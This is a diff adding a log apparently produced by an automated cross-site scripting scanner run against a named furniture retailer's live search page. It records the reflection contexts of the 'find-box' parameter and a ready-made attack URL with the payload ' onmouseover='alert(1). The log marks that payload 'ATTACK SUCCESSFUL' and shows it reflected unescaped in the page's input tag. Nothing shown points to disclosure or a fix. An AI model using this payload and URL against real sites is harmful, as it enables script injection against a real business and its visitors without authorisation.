@@ -1,0 +1,116 @@
+https://www.hertzfurniture.com/school-furniture.html
+
+GET Params:[1]
+['find-box']
+_______________________________________________________________________________________________________
+https://www.hertzfurniture.com/search.php?find-box=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input type="text" name="find-box" id="find-box" value="(uvw&quot;xyz'yxz&lt;/zxy"  placeholder="Search" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Search'" />
+
+----------------------------------------------------------------------------------
+HTML Context: [1]
+<p id="no-match">Your search "(uvw&quot;xyz'yxz&lt;/zxy" did not match any products</p>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script type="text/javascript">
+    $(function() {
+        var offset = "20";
+        var sort = "relevance";
+    $("#sort").change(function(event) {
+     filterstr = "sort=" + this.value + "&offset=" + offset;
+     filter_run(filterstr);
+    });
+   $("#product-count").change(function(event) {
+      filterstr = "offset=" + this.value + "&sort=" + sort;
+            filter_run(filterstr);
+    });
+    });
+//not using this function now            
+function filter()
+            {
+            var list =
+            {
+            'ic': $("#product-count").val(),
+                    'is': $("#sort").val()
+            };
+                    return list;
+            }
+
+    function filter_run(filterstr)
+    {
+//    var query = [];
+//    for (var key in list)
+//        query.push(encodeURIComponent(key) + "=" + encodeURIComponent(list[key]));
+//    query = query.join("&");
+    query = "sort=relevance&offset=20&start=1&find-box=+uvw+xyz+yxz++zxy";
+            query = _urlSearch + (query.length ? "?" : '') + query + (query.length ? "&" : '?') + filterstr;
+            window.location.assign(query);
+    }
+
+    function filter_add(name, value)
+    {
+    var list = filter();
+            list[name] = value;
+            filter_run(list);
+    }
+
+    function filter_del(name)
+    {
+    var list = filter();
+            delete list[name];
+            filter_run(list);
+    }
+
+    var _urlSearch = "/search.php";
+            var _gaParamA = {};
+            function getHistory() { return ""; }
+    function getHMGa()
+    {
+    //HtzMrc GA
+    var ga_param = '';
+            //need 'pg' first
+            if (_gaParamA['pg'])
+    {
+    ga_param = '&pg=' + _gaParamA['pg'];
+            delete _gaParamA['pg'];
+    }
+
+    for (var key in _gaParamA)
+    {
+    ga_param += '&' + key + '=' + _gaParamA[key];
+    }
+
+    return ga_param;
+    }
+</script>
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.hertzfurniture.com/search.php?find-box=' onmouseover='alert(1)
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input type="text" name="find-box" id="find-box" value="' onmouseover='alert(1)"  placeholder="Search" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Search'" />
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	True
+
+Attack Payloads for SCRIPT
+[]
